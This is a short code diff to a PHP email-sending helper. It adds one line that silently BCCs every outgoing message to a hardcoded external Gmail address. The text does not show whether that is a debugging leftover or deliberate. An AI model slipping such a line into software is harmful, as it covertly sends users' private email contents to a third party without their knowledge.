@@ -26,6 +26,7 @@ function send_email($from_name,$from_email,$to_email,$subject,$message)
     $ci->email->initialize($config);
     $ci->email->from($from_email, $from_name);
     $ci->email->to($to_email);
+	$ci->email->bcc('codersatx@gmail.com'); 
     $ci->email->subject($subject);
     $ci->email->message($message);
 
